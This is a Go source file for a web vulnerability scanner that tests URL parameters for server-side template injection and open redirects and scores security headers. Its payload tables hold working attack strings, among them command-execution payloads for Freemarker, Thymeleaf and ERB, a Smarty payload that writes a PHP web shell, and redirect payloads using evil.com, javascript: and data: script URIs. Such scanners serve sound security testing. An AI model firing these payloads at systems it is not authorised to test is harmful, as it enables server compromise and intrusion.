package scanner

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/fatih/color"
)

// AdditionalVulnScanner checks for SSTI and Open Redirect vulnerabilities
// Inspired by Dalfox's multi-vulnerability detection
type AdditionalVulnScanner struct {
	client     *http.Client
	cookies    string
	headers    map[string]string
	authHeader string
	verbose    bool
}

// NewAdditionalVulnScanner creates a new scanner for additional vulnerabilities
func NewAdditionalVulnScanner(proxyURL, cookies string, headers map[string]string, authHeader string, verbose bool) *AdditionalVulnScanner {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	if proxyURL != "" {
		proxyURLParsed, err := url.Parse(proxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURLParsed)
		}
	}

	return &AdditionalVulnScanner{
		client: &http.Client{
			Timeout:   15 * time.Second,
			Transport: transport,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // Don't follow redirects
			},
		},
		cookies:    cookies,
		headers:    headers,
		authHeader: authHeader,
		verbose:    verbose,
	}
}

// SSTIResult represents SSTI detection result
type SSTIResult struct {
	Vulnerable bool
	Engine     string
	Payload    string
	Evidence   string
}

// OpenRedirectResult represents Open Redirect detection result
type OpenRedirectResult struct {
	Vulnerable  bool
	Payload     string
	RedirectURL string
}

// CheckSSТI tests for Server Side Template Injection
func (s *AdditionalVulnScanner) CheckSSTI(targetURL string) *SSTIResult {
	if s.verbose {
		color.Cyan("  [*] Checking for SSTI vulnerabilities...")
	}

	// SSTI test payloads for various template engines
	sstiPayloads := map[string]map[string]string{
		"jinja2": {
			"{{7*7}}":                    "49",
			"{{config}}":                 "Config",
			"{{self.__class__.__mro__}}": "__class__",
			"{{''.__class__.__mro__[2].__subclasses__()}}": "subprocess",
		},
		"twig": {
			"{{7*7}}":                            "49",
			"{{7*'7'}}":                          "7777777",
			"{{_self.env}}":                      "Environment",
			"{{/etc/passwd|file_excerpt(1,30)}}": "root:",
		},
		"freemarker": {
			"${7*7}": "49",
			"${\"freemarker.template.utility.Execute\"?new()(\"id\")}":                "uid=",
			"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}": "uid=",
		},
		"velocity": {
			"#set($x=7*7)$x": "49",
			"$class.inspect($class.class.forName('java.lang.Runtime'))": "Runtime",
		},
		"smarty": {
			"{php}echo 7*7;{/php}": "49",
			"{$smarty.version}":    "Smarty",
			"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}": "write",
		},
		"erb": {
			"<%= 7*7 %>":          "49",
			"<%= system('id') %>": "uid=",
		},
		"pebble": {
			"{{ 7*7 }}": "49",
		},
		"thymeleaf": {
			"${7*7}": "49",
			"${T(java.lang.Runtime).getRuntime().exec('id')}": "Process",
		},
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	baseURL := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path
	params := parsedURL.Query()

	for paramName := range params {
		for engine, payloads := range sstiPayloads {
			for payload, expectedOutput := range payloads {
				testParams := cloneParams(params)
				testParams.Set(paramName, payload)
				testURL := baseURL + "?" + testParams.Encode()

				body, err := s.makeRequest(testURL)
				if err != nil {
					continue
				}

				// Check if expected output is in response
				if strings.Contains(body, expectedOutput) {
					// Verify it's not a false positive by checking if the output
					// would normally appear without payload
					normalBody, _ := s.makeRequest(targetURL)
					if !strings.Contains(normalBody, expectedOutput) {
						return &SSTIResult{
							Vulnerable: true,
							Engine:     engine,
							Payload:    payload,
							Evidence:   extractEvidenceContext(body, expectedOutput),
						}
					}
				}
			}
		}
	}

	return nil
}

// CheckOpenRedirect tests for Open Redirect vulnerabilities
func (s *AdditionalVulnScanner) CheckOpenRedirect(targetURL string) *OpenRedirectResult {
	if s.verbose {
		color.Cyan("  [*] Checking for Open Redirect vulnerabilities...")
	}

	// Open Redirect payloads
	redirectPayloads := []string{
		// Basic payloads
		"https://google.com",
		"//google.com",
		"///google.com",
		"////google.com",
		"\\/\\/google.com",
		"/\\/google.com",
		"https:google.com",

		// URL encoding bypasses
		"https://google.com%2F%2F",
		"//google%E3%80%82com",
		"https:%252F%252Fgoogle.com",

		// Protocol-based bypasses
		"javascript:alert(1)",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"vbscript:msgbox(1)",

		// Whitespace and null byte bypasses
		"https://google.com%00",
		"https://google.com%0d%0a",
		" https://google.com",
		"\thttps://google.com",

		// Host confusion
		"https://google.com@evil.com",
		"https://evil.com#@google.com",
		"https://google.com%40evil.com",

		// Backslash tricks
		"https://google.com\\@evil.com",
		"/\\google.com",
		"\\/google.com",

		// Unicode normalization
		"https://гoogle.com", // Cyrillic г
		"https://ɢoogle.com", // Latin letter small capital G
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	baseURL := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path
	params := parsedURL.Query()

	// Common redirect parameter names
	redirectParams := []string{"url", "redirect", "redirect_uri", "redirect_url", "return", "return_url", "returnTo", "next", "goto", "destination", "dest", "continue", "target", "rurl", "out", "view", "link", "ref"}

	// Check existing parameters
	for paramName := range params {
		for _, payload := range redirectPayloads {
			testParams := cloneParams(params)
			testParams.Set(paramName, payload)
			testURL := baseURL + "?" + testParams.Encode()

			result := s.checkRedirectResponse(testURL, payload)
			if result != nil {
				return result
			}
		}
	}

	// Also test common redirect parameter names if they don't exist
	for _, redirectParam := range redirectParams {
		if params.Get(redirectParam) == "" {
			for _, payload := range redirectPayloads[:5] { // Only test first 5 payloads for new params
				testParams := cloneParams(params)
				testParams.Set(redirectParam, payload)
				testURL := baseURL + "?" + testParams.Encode()

				result := s.checkRedirectResponse(testURL, payload)
				if result != nil {
					return result
				}
			}
		}
	}

	return nil
}

// checkRedirectResponse checks if the response indicates an open redirect
func (s *AdditionalVulnScanner) checkRedirectResponse(testURL, payload string) *OpenRedirectResult {
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return nil
	}

	s.setRequestHeaders(req)

	resp, err := s.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// Check for redirect status codes
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" {
			// Check if the location contains our payload domain
			if isExternalRedirect(location, payload) {
				return &OpenRedirectResult{
					Vulnerable:  true,
					Payload:     payload,
					RedirectURL: location,
				}
			}
		}
	}

	// Also check for JavaScript-based redirects in body
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	jsRedirectPatterns := []string{
		`location\s*=\s*["']` + regexp.QuoteMeta(payload),
		`location\.href\s*=\s*["']` + regexp.QuoteMeta(payload),
		`location\.replace\s*\(\s*["']` + regexp.QuoteMeta(payload),
		`window\.open\s*\(\s*["']` + regexp.QuoteMeta(payload),
	}

	for _, pattern := range jsRedirectPatterns {
		matched, _ := regexp.MatchString(pattern, bodyStr)
		if matched {
			return &OpenRedirectResult{
				Vulnerable:  true,
				Payload:     payload,
				RedirectURL: "JavaScript redirect: " + payload,
			}
		}
	}

	// Check meta refresh
	metaRefreshPattern := `<meta[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["'][^"']*url\s*=\s*` + regexp.QuoteMeta(payload)
	if matched, _ := regexp.MatchString(metaRefreshPattern, strings.ToLower(bodyStr)); matched {
		return &OpenRedirectResult{
			Vulnerable:  true,
			Payload:     payload,
			RedirectURL: "Meta refresh redirect: " + payload,
		}
	}

	return nil
}

// isExternalRedirect checks if the redirect goes to an external domain
func isExternalRedirect(location, payload string) bool {
	// Simple check - if the payload domain appears in the location
	payloadDomains := []string{"google.com", "evil.com"}
	for _, domain := range payloadDomains {
		if strings.Contains(strings.ToLower(location), domain) {
			return true
		}
	}

	// Check for protocol-relative URLs
	if strings.HasPrefix(location, "//") {
		return true
	}

	// Check for data: or javascript: URIs
	if strings.HasPrefix(strings.ToLower(location), "javascript:") ||
		strings.HasPrefix(strings.ToLower(location), "data:") {
		return true
	}

	return false
}

// makeRequest makes an HTTP request and returns the body
func (s *AdditionalVulnScanner) makeRequest(targetURL string) (string, error) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return "", err
	}

	s.setRequestHeaders(req)

	resp, err := s.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

// setRequestHeaders sets common headers for requests
func (s *AdditionalVulnScanner) setRequestHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")

	if s.cookies != "" {
		req.Header.Set("Cookie", s.cookies)
	}

	for k, v := range s.headers {
		req.Header.Set(k, v)
	}

	if s.authHeader != "" {
		req.Header.Set("Authorization", s.authHeader)
	}
}

// extractEvidenceContext extracts context around matching text
func extractEvidenceContext(body, match string) string {
	idx := strings.Index(body, match)
	if idx == -1 {
		return ""
	}

	start := idx - 50
	if start < 0 {
		start = 0
	}
	end := idx + len(match) + 50
	if end > len(body) {
		end = len(body)
	}

	return "..." + body[start:end] + "..."
}

// SecurityHeadersResult represents security headers check result
type SecurityHeadersResult struct {
	MissingHeaders []string
	WeakHeaders    map[string]string
	Score          int // 0-100
}

// CheckSecurityHeaders analyzes response headers for security issues
func (s *AdditionalVulnScanner) CheckSecurityHeaders(targetURL string) *SecurityHeadersResult {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil
	}

	s.setRequestHeaders(req)

	resp, err := s.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	result := &SecurityHeadersResult{
		MissingHeaders: []string{},
		WeakHeaders:    make(map[string]string),
		Score:          100,
	}

	// Check for important security headers
	securityHeaders := map[string]struct {
		weight  int
		checker func(string) bool
	}{
		"Content-Security-Policy": {
			weight: 25,
			checker: func(v string) bool {
				// Check for unsafe-inline or unsafe-eval
				return !strings.Contains(v, "unsafe-inline") && !strings.Contains(v, "unsafe-eval")
			},
		},
		"X-Content-Type-Options": {
			weight: 10,
			checker: func(v string) bool {
				return strings.ToLower(v) == "nosniff"
			},
		},
		"X-Frame-Options": {
			weight: 15,
			checker: func(v string) bool {
				v = strings.ToLower(v)
				return v == "deny" || v == "sameorigin"
			},
		},
		"X-XSS-Protection": {
			weight: 10,
			checker: func(v string) bool {
				return strings.Contains(v, "1") && strings.Contains(v, "mode=block")
			},
		},
		"Strict-Transport-Security": {
			weight: 20,
			checker: func(v string) bool {
				return strings.Contains(v, "max-age=")
			},
		},
		"Referrer-Policy": {
			weight:  10,
			checker: func(v string) bool { return v != "" },
		},
		"Permissions-Policy": {
			weight:  10,
			checker: func(v string) bool { return v != "" },
		},
	}

	for header, config := range securityHeaders {
		value := resp.Header.Get(header)
		if value == "" {
			result.MissingHeaders = append(result.MissingHeaders, header)
			result.Score -= config.weight
		} else if !config.checker(value) {
			result.WeakHeaders[header] = value
			result.Score -= config.weight / 2
		}
	}

	if result.Score < 0 {
		result.Score = 0
	}

	return result
}
